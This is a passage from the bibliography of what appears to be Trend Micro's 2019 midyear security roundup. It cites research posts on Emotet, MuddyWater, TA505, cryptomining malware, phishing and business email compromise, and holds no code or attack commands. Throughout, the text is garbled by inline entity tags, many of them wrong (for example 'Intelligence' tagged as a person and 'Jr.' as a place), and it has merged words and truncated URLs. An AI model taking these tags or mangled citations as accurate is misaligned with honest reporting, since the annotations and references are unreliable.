propagation - methods - including - eternalblue - powershell - [PERSON] abuse/.42 [PERSON] Erika [PERSON] Mendoza , [PERSON] Jay [PERSON] Yaneza , [PERSON] Gilbert [PERSON] Sison , [PERSON] Anjali [PERSON] Patil , [PERSON] Julie [PERSON] Cabuhat , and [PERSON] Joelson [PERSON] Soares . ( [DATE] 29 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [ORG] IntelligenceBlog . \u201c [WORK_OF_ART] Emotet - Distributed [WORK_OF_ART] Ransomware [WORK_OF_ART] Loader for [PERSON] Nozelesn [PERSON] Found via [ORG] Managed [ORG] Detection and [ORG] Response . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Henry [PERSON] Alarcon , [GPE] Jr. and [PERSON] Raphael [PERSON] Centeno . ( [DATE] 4 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Fileless [ORG] Banking [ORG] Trojan Targeting BrazilianBanks Downloads Possible Botnet Capability , [PERSON] Info [PERSON] Stealers . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / fileless - banking - trojan - targeting - brazilian - banks - downloads - possible - botnet - capability - info - stealers/.44 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Kiyoshi [PERSON] Obuchi . ( [DATE] 12 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c From [ORG] Fileless [ORG] Techniques to UsingSteganography : Examining Powload \u2019s Evolution . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url from - fileless - techniques - to - using - steganography - examining - powloads - evolution/.45 Miguel Ang . ( [DATE] 20 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Trickbot Watch : Arrival via Redirection URL in Spam . \u201d Last accessed on [DATE] 24July [DATE] 2019 at url [PERSON] Hiroyuki [PERSON] Kakara and [PERSON] Kazuki [PERSON] Fujisawa . ( [DATE] 17 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Potential [WORK_OF_ART] Targeted [WORK_OF_ART] Attack [WORK_OF_ART] Uses AutoHotkey andMalicious Script Embedded in [ORG] Excel [ORG] File [ORG] to [ORG] Avoid [ORG] Detection . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / potential - targeted - attack - uses - autohotkey - and - malicious - script - embedded - in - excel - file - to - avoid - detection/.47 Janus Agcaoili . ( [DATE] 5 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Monero - [ORG] Mining [ORG] Malware [ORG] PCASTLE [ORG] Zeroes [ORG] Back In on [GPE] China , Now UsesMultilayered Fileless [PERSON] Arrival [PERSON] Techniques . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url mining - malware - pcastle - zeroes - back - in - on - china - now - uses - multilayered - fileless - arrival - techniques/.48 Johnlery Triunfante . ( [DATE] 3 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] BlackSquid [WORK_OF_ART] Slithers [WORK_OF_ART] Into [WORK_OF_ART] Servers [WORK_OF_ART] and [WORK_OF_ART] Drives [WORK_OF_ART] With [WORK_OF_ART] 8 [WORK_OF_ART] Notorious [WORK_OF_ART] Exploitsto Drop [PERSON] XMRig [PERSON] Miner . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url servers - and - drives - with-8 - notorious - exploits - to - drop - xmrig - miner/.49 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Jakub [PERSON] Urbanec . ( [DATE] 23 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c New Mirai Variant Uses Multiple Exploits to [ORG] Target [ORG] Routers and Other Devices . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url variant - uses - multiple - exploits - to - target - routers - and - other - devices/.50 Trend Micro . ( [DATE] 25 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [PRODUCT] Cybersecurity [PRODUCT] Skills Shortage a Problem for Nearly 50 Percent of Organizations . \u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url shortage - a - problem - for - nearly-50 - percent - of - organizations/.51 Trend Micro . ( [DATE] 5 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c 2018 Mobile Threat Landscape . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 aturl [PERSON] Kevin [PERSON] Sun . ( [DATE] 17 [DATE] January [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Google Play Apps Drop Anubis Banking Malware , Use Motion - basedEvasion [ORG] Tactics . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url banking - malware - use - motion - based - evasion - tactics/.53 [PERSON] Tony [PERSON] Bao . ( [DATE] 8 [DATE] July [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Anubis Android [PERSON] Malware [PERSON] Returns with Over 17,000 Samples . \u201d Last accessed on24 [DATE] July [DATE] 2019 at url [ORG] Mobile [ORG] Threat [ORG] Response [ORG] Team . ( [DATE] 18 [DATE] January [DATE] 2017 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c In Review : [DATE] 2016 \u2019s Mobile Threat Landscape BringsDiversity , [GPE] Scale , and [PERSON] Scope . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url landscape/.55 [PERSON] Joseph [PERSON] C. [PERSON] Chen . ( [DATE] 27 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [PERSON] ShadowGate [PERSON] Returns to Worldwide Operations With Evolved GreenflashSundown Exploit Kit . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 url worldwide - operations - with - evolved - greenflash - sundown - exploit - kit/.56 Trend Micro . ( [DATE] 2016 ) . [ORG] Trend [ORG] Micro . \u201c Setting the Stage : Landscape Shifts Dictate Future Threat Response Strategies . \u201d Last accessed on1 [DATE] August [DATE] 2019 at url [PERSON] Lion [PERSON] Gu , [PERSON] Vladimir [PERSON] Kropotov , and [PERSON] Fyodor [PERSON] Yarochkin . ( [DATE] 13 [DATE] June [DATE] 2017 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Fake [WORK_OF_ART] News and [PERSON] Cyber [PERSON] Propaganda : The Useand Abuse of Social Media . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url threats / fake - news - cyber - propaganda - the - abuse - of - social - media/.58 [PERSON] Cedric [PERSON] Pernet , [PERSON] Daniel [PERSON] Lunghi , [PERSON] Jaromir [PERSON] Horejsi , and [PERSON] Joseph [PERSON] C. [PERSON] Chen . ( [DATE] 7 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c New SLUB BackdoorUses GitHub , [ORG] Communicates via [ORG] Slack . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url slub - backdoor - uses - github - communicates - via - slack/.59 Jindrich Karasek and [PERSON] Cedric [PERSON] Pernet . ( [DATE] 28 [DATE] February [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c How a Hacking Group is Stealing PopularInstagram Profiles . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url stealing - popular - instagram - profiles/.40 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive Effects60 [PERSON] Hara [PERSON] Hiroaki , [PERSON] Lilang [PERSON] Wu , and [PERSON] Lorin [PERSON] Wu . ( [DATE] 2 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c New Version of XLoader That Disguises as [ORG] AndroidApps and an iOS Profile Holds New Links to [ORG] FakeSpy . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / new - version - of - xloader - that - disguises - as - android - apps - and - an - ios - profile - holds - new - links - to - fakespy/.61 Trend Micro . ( [DATE] 28 [DATE] February [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Shifting Strategies : [ORG] Using [ORG] Social [ORG] Media , [ORG] SEO in Tech Support Scams . \u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url tech - support - scams/.62Vladimir Kropotov and [PERSON] Fyodor [PERSON] Yarochkin . ( [DATE] 30 [DATE] July [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Hunting [WORK_OF_ART] Threats [WORK_OF_ART] on [WORK_OF_ART] Twitter : [WORK_OF_ART] How [WORK_OF_ART] Social [WORK_OF_ART] Media [WORK_OF_ART] Can [WORK_OF_ART] Be [WORK_OF_ART] Used [WORK_OF_ART] to [WORK_OF_ART] Gather [WORK_OF_ART] Actionable [WORK_OF_ART] Threat [WORK_OF_ART] Intelligence . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url cybercrime - and - digital - threats / hunting - threats - on - twitter/.63 Ecular [PERSON] Xu and [PERSON] Grey [PERSON] Guo . ( [DATE] 18 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Mobile [ORG] Cyberespionage [ORG] Campaign [ORG] \u2018 Bouncing Golf \u2019 AffectsMiddle East . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url bouncing - golf - affects - middle - east/.64 Hara Hiroaki and [PERSON] Loseway [PERSON] Lu . ( [DATE] 12 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Shifting Tactics : Breaking Down TA505 Group \u2019s Use of HTML , RATs and Other Techniques in Latest Campaigns . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / shifting - tactics - breaking - down - ta505 - groups - use - of - html - rats - and - other - techniques - in - latest - campaigns/.65 [PERSON] Hara [PERSON] Hiroaki and [PERSON] Loseway [PERSON] Lu . ( [DATE] 4 [DATE] July [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Latest [WORK_OF_ART] Spam [WORK_OF_ART] Campaigns from TA505 Now Using NewMalware [PERSON] Tools [PERSON] Gelup and [ORG] FlowerPippi . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url spam - campaigns - from - ta505 - now - using - new - malware - tools - gelup - and - flowerpippi/.66 [PERSON] Jaromir [PERSON] Horejsi . ( [DATE] 12 [DATE] March [DATE] 2018 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Campaign [ORG] Possibly [ORG] Connected to \u201c [WORK_OF_ART] MuddyWater \u201d [WORK_OF_ART] Surfaces [WORK_OF_ART] in [WORK_OF_ART] the [WORK_OF_ART] MiddleEast [WORK_OF_ART] and [WORK_OF_ART] Central [WORK_OF_ART] Asia . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url connected - muddywater - surfaces - middle - east - central - asia/.67 [PERSON] Jaromir [PERSON] Horejsi and [PERSON] Daniel [PERSON] Lunghi . ( [DATE] 30 [DATE] November [DATE] 2018 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c New PowerShell - based [PERSON] Backdoor [PERSON] Found [PERSON] inTurkey , Strikingly Similar to MuddyWater Tools . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url new - powershell - based - backdoor - found - in - turkey - strikingly - similar - to - muddywater - tools/.68 [PERSON] Daniel [PERSON] Lunghi and [PERSON] Jaromir [PERSON] Horejsi . ( [DATE] 10 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] MuddyWater [ORG] Resurfaces , [ORG] Uses Multi - Stage [ORG] BackdoorPOWERSTATS [ORG] V3 and [ORG] New Post - Exploitation [ORG] Tools . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / muddywater - resurfaces - uses - multi - stage - backdoor - powerstats - v3 - and - new - post - exploitation - tools/.69 CoinDesk . ( n.d . ) . CoinDesk . \u201c Bitcoin Price Index \u2014 Real - time Bitcoin Price Charts . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] CoinDesk . ( n.d . ) . CoinDesk . \u201c Monero Price Index \u2014 Real - time [PERSON] Monero ( [ORG] XMR ) [PERSON] Price [PERSON] Charts . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [PERSON] Sergio [PERSON] Pastrana and [PERSON] Guillermo Suarez - Tangil . ( [DATE] 3 [DATE] January [DATE] 2019 ) . [ORG] ArXiv . \u201c [WORK_OF_ART] A [WORK_OF_ART] First [WORK_OF_ART] Look [WORK_OF_ART] at [WORK_OF_ART] the Crypto - [WORK_OF_ART] Mining [WORK_OF_ART] Malware Ecosystem : [WORK_OF_ART] A [WORK_OF_ART] Decade [WORK_OF_ART] ofUnrestricted [WORK_OF_ART] Wealth . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url [PERSON] Tom [PERSON] Wilson . ( [DATE] 15 [DATE] May [DATE] 2019 ) . [ORG] Reuters . \u201c [PERSON] Explainer : \u2018 Privacy coin \u2019 [PERSON] Monero offers near total anonymity . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 aturl idUSKCN1SL0F0.73 [PERSON] Danny [PERSON] Palmer . ( [DATE] 20 [DATE] February [DATE] 2018 ) . ZDNet . \u201c Cyber attackers are cashing in on cryptocurrency mining - but here \u2019s why they \u2019re avoiding bitcoin . \u201dLast accessed on [DATE] 2 [DATE] August [DATE] 2019 at url theyre - avoiding - bitcoin/.74 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Jakub [PERSON] Urbanec . ( [DATE] 8 [DATE] February [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Linux [WORK_OF_ART] Coin [WORK_OF_ART] Miner [WORK_OF_ART] Copied [WORK_OF_ART] Scripts [WORK_OF_ART] FromKORKERDS , Removes All Other Malware and Miners . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / linux - coin - miner - copied - scripts - from - korkerds - removes - all - other - malware - and - miners/.75 Don [PERSON] Ovid [PERSON] Ladores , [PERSON] Michael [PERSON] Jhon [PERSON] Ofiaza , and [PERSON] Gilbert [PERSON] Sison . ( [DATE] 20 [DATE] February [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [PERSON] Monero [PERSON] Miner - MalwareUses RADMIN , MIMIKATZ to Infect , Propagate via Vulnerability . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url security - intelligence / monero - miner - malware - uses - radmin - mimikatz - to - infect - propagate - via - vulnerability/.76 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Arvin [PERSON] Macaraeg . ( [DATE] 12 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Miner [PERSON] Malware [PERSON] Spreads Beyond [GPE] China , [ORG] UsesMultiple [ORG] Propagation [ORG] Methods [ORG] Including [ORG] EternalBlue , [PERSON] Powershell [PERSON] Abuse . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url trendlabs - security - intelligence / miner - malware - spreads - beyond - china - uses - multiple - propagation - methods - including - eternalblue - powershell- abuse/.77 Janus Agcaoili . ( [DATE] 5 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Monero - [ORG] Mining [ORG] Malware [ORG] PCASTLE [ORG] Zeroes [ORG] Back In on [GPE] China , Now UsesMultilayered Fileless [PERSON] Arrival [PERSON] Techniques . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url mining - malware - pcastle - zeroes - back - in - on - china - now - uses - multilayered - fileless - arrival - techniques/.78 Augusto II Remillano and [PERSON] Robert [PERSON] Malagad . ( [DATE] 7 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c CVE-2019 - 3396 Redux : Confluence VulnerabilityExploited to Deliver Cryptocurrency Miner With Rootkit . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / cve-2019 - 3396 - redux - confluence - vulnerability - exploited - to - deliver - cryptocurrency - miner - with - rootkit/.79 Jindrich Karasek . ( [DATE] 20 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Cryptocurrency - Mining Botnet Malware Arrives Through ADB andSpreads Through [ORG] SSH . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url botnet - arrives - through - adb - and - spreads - through - ssh/.41 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive [CARDINAL] Effects80 [PERSON] Augusto [PERSON] Remillano [PERSON] II . ( [DATE] 13 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Outlaw [ORG] Hacking [ORG] Group \u2019s Botnet Observed Spreading Miner , Perl - Based [ORG] Backdoor . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url observed - spreading - miner - perl - based - backdoor/.81 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Mark [PERSON] Vicente . ( [DATE] 28 [DATE] June [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Golang - based Spreader Used in aCryptocurrency - [ORG] Mining [ORG] Malware [ORG] Campaign . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 url based - spreader - used - in - a - cryptocurrency - mining - malware - campaign/.82 Trend Micro Research . ( [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Mapping [WORK_OF_ART] the Future : [WORK_OF_ART] Dealing [WORK_OF_ART] With [WORK_OF_ART] Pervasive [WORK_OF_ART] and [WORK_OF_ART] Persistent [WORK_OF_ART] Threats . \u201d Last accessed on [CARDINAL] 24 July2019 at url [PERSON] Chris [PERSON] Doman and [PERSON] Tom [PERSON] Hegel . ( [DATE] 14 [DATE] March [DATE] 2019 ) . [ORG] AT&T [ORG] Cybersecurity . \u201c Making it Rain - Cryptocurrency Mining Attacks in the Cloud . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] 1 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Exposed Docker Control API and [ORG] Community [ORG] Image [ORG] Abused to DeliverCryptocurrency - [ORG] Mining [ORG] Malware . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url docker - control - api - and - community - image - abused - to - deliver - cryptocurrency - mining - malware/.85 Alfredo Oliveira . ( [DATE] 30 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Infected [ORG] Cryptocurrency - [ORG] Mining [ORG] Containers [ORG] Target [ORG] Docker Hosts WithExposed APIs , [PERSON] Use [PERSON] Shodan to Find Additional Victims . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / infected - cryptocurrency - mining - containers - target - docker - hosts - with - exposed - apis - use - shodan - to - find - additional - victims/.86 Trend Micro . ( [DATE] 10 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Jenkins [WORK_OF_ART] Vulnerability [WORK_OF_ART] Exploited to [ORG] Drop [ORG] Kerberods [ORG] Malware and [PERSON] Launch [PERSON] MoneroMiner . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url exploited - to - drop - kerberods - malware - and - launch - monero - miner/.87 Check Point Research . ( [DATE] 15 [DATE] February [DATE] 2018 ) . Check Point Research . \u201c [PERSON] Jenkins [PERSON] Miner : [CARDINAL] One of [ORG] the [ORG] Biggest [ORG] Mining [ORG] Operations [ORG] Ever [ORG] Discovered . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Jon [PERSON] Porter . ( [DATE] 28 [DATE] February [DATE] 2019 ) . The [ORG] Verge . \u201c Popular \u2018 cryptojacking \u2019 service Coinhive will shut down [DATE] next [DATE] week . \u201d Last accessed on [DATE] 24 [DATE] July 2019at url [PERSON] Radiflow . ( [DATE] 8 [DATE] February [DATE] 2018 ) . Radiflow . \u201c [WORK_OF_ART] Radiflow [WORK_OF_ART] Reveals [WORK_OF_ART] First [WORK_OF_ART] Documented [WORK_OF_ART] Cryptocurrency [PERSON] Malware [PERSON] Attack on a [ORG] SCADA [ORG] Network . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Dave [PERSON] Shackleford . ( [DATE] 30 [DATE] April [DATE] 2019 ) . SANS Institute . \u201c SANS [DATE] 2019 Cloud Security Survey . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Trend [ORG] Micro . ( [DATE] 2 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [CARDINAL] More [CARDINAL] than [CARDINAL] 13,000 [CARDINAL] Misconfigured iSCSI Storage Clusters Accessible via the PublicInternet . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url 000 - misconfigured - iscsi - storage - clusters - accessible - via - the - public - internet/.92 Trend Micro . ( [DATE] 14 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Unsecured [PERSON] Server [PERSON] Leaks [PERSON] PII of [PERCENT] Almost 90 % of [GPE] Panama [GPE] Residents . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] DevOps . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] EU [ORG] General [ORG] Data [ORG] Protection [ORG] Regulation ( GDPR ) . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Asaf [ORG] Cidon . ( [DATE] 2 [DATE] May [DATE] 2019 ) . [PERSON] Barracuda [PERSON] Journey [PERSON] Notes . \u201c [WORK_OF_ART] Threat Spotlight : Account Takeover . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [PERSON] Abhishek [PERSON] Agrawal , [PERSON] David [PERSON] Fantham , [PERSON] Debraj [PERSON] Ghosh , [PERSON] Diana [PERSON] Kelley , [PERSON] Elia [PERSON] Florio , [PERSON] Eric [PERSON] Avena , [PERSON] Eric [PERSON] Douglas , et al . ( [DATE] 2019 ) . [ORG] Microsoft [ORG] Corporation . \u201cMicrosoft Security Intelligence Report , Volume [DATE] 24 , [DATE] January [DATE] \u2013 [DATE] December [DATE] 2018 . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [WORK_OF_ART] azureedge.net/gdc/gdc09FrGq/original.97 [WORK_OF_ART] Lorin [WORK_OF_ART] Wu . ( [DATE] 30 [DATE] January [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Various [WORK_OF_ART] Google [WORK_OF_ART] Play [WORK_OF_ART] \u2018 Beauty Camera \u2019 [WORK_OF_ART] Apps [WORK_OF_ART] Send [WORK_OF_ART] Users [WORK_OF_ART] Pornographic [WORK_OF_ART] Content , Redirect Them to Phishing Websites and Collect Their Pictures . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url trendlabs - security - intelligence / various - google - play - beauty - camera - apps - sends - users - pornographic - content - redirects - them - to - phishing- websites - and - collects - their - pictures/.98 [PERSON] Joseph [PERSON] C. [PERSON] Chen . ( [DATE] 28 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Desktop , [ORG] Mobile [ORG] Phishing [ORG] Campaign [ORG] Targets [ORG] South [ORG] Korean Websites , Steals [ORG] Credentials [PERSON] Via [PERSON] Watering [PERSON] Hole . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url mobile - phishing - campaign - targets - south - korean - websites - steals - credentials - via - watering - hole/.99 [PERSON] Samuel [PERSON] P. [PERSON] Wang . ( [DATE] 4 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Phishing [WORK_OF_ART] Attack [WORK_OF_ART] Uses [WORK_OF_ART] Browser [WORK_OF_ART] Extension [WORK_OF_ART] Tool [WORK_OF_ART] SingleFile [WORK_OF_ART] to [WORK_OF_ART] Obfuscate [WORK_OF_ART] Malicious Log - [WORK_OF_ART] in [WORK_OF_ART] Pages . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url browser - extension - tool - singlefile - to - obfuscate - malicious - log - in - pages/.100 [ORG] Trend [ORG] Micro . ( [DATE] 29 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Health Information of [CARDINAL] 350,000 [GPE] Oregon DHS Clients Exposed After [PERSON] Phishing [PERSON] Attack . \u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [CARDINAL] 350 - 000 - oregon - dhs - clients - exposed - after - phishing - [PERSON] attack/.101 [PERSON] Catalin [PERSON] Cimpanu . ( [DATE] 11 [DATE] April [DATE] 2019 ) . ZDNet . \u201c [PERSON] Emotet hijacks email conversation threads to insert links to malware . \u201d Last accessed on [DATE] 24 [DATE] July 2019at url | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive Effects102 [PERSON] Erika [PERSON] Mendoza , [PERSON] Anjali [PERSON] Patil , and [PERSON] Jay [PERSON] Yaneza . ( [DATE] 9 [DATE] October [DATE] 2018 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [ORG] Phishing [ORG] Campaign uses [ORG] HijackedEmails [ORG] to [ORG] Deliver [ORG] URSNIF by [ORG] Replying [ORG] to [ORG] Ongoing [ORG] Threads . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / phishing - campaign - uses - hijacked - emails - to - deliver - ursnif - by - replying - to - ongoing - threads/.103 Miguel Ang and [PERSON] Donald [PERSON] Castillo . ( [DATE] 29 [DATE] October [DATE] 2018 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Same Old yet Brand - new : [ORG] New [ORG] File [ORG] Types [ORG] Emerge in [PERSON] Malware [PERSON] Spam [PERSON] Attachments . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url brand - new - new - file - types - emerge - in - malware - spam - attachments/.104 [ORG] Proofpoint [ORG] Information [ORG] Protection [ORG] Research [ORG] Team . ( [DATE] 14 [DATE] March [DATE] 2019 ) . Proofpoint . \u201c Threat actors leverage credential dumps , phishing , and legacyemail protocols to bypass [ORG] MFA and breach cloud accounts worldwide . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url threat - insight / post / threat - actors - leverage - credential - dumps - phishing - and - legacy - email - protocols/.105 [ORG] APWG . ( [DATE] 15 [DATE] May [DATE] 2019 ) . [ORG] APWG . \u201c [WORK_OF_ART] Phishing [WORK_OF_ART] Activity [WORK_OF_ART] Trends [WORK_OF_ART] Report , [DATE] 1st [DATE] Quarter [DATE] 2019 . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 25 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c IC3 : BEC Cost Organizations US$ 1.2 [MONEY] Billion in [DATE] 2018 . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019at url [PRODUCT] Katia [PRODUCT] Moskvitch . ( [DATE] 20 [DATE] March [DATE] 2019 ) . Wired [GPE] UK . \u201c Cyber criminals are targeting HR departments to steal your salary . \u201d Last accessed on 1 August2019 at url [WORK_OF_ART] Sachin [WORK_OF_ART] Dave . ( [DATE] 10 [DATE] January [DATE] 2019 ) . [ORG] The [ORG] Economic [ORG] Times . \u201c How [NORP] Chinese hackers pulled off the [NORP] Italian con job , a Rs [CARDINAL] 130 - crore heist . \u201d Last accessedon 1 August 2019 at url heist / [PERSON] articleshow/67464588.cms.109 [PERSON] Nick [PERSON] Wooten . ( [DATE] 8 [DATE] January [DATE] 2019 ) . [ORG] 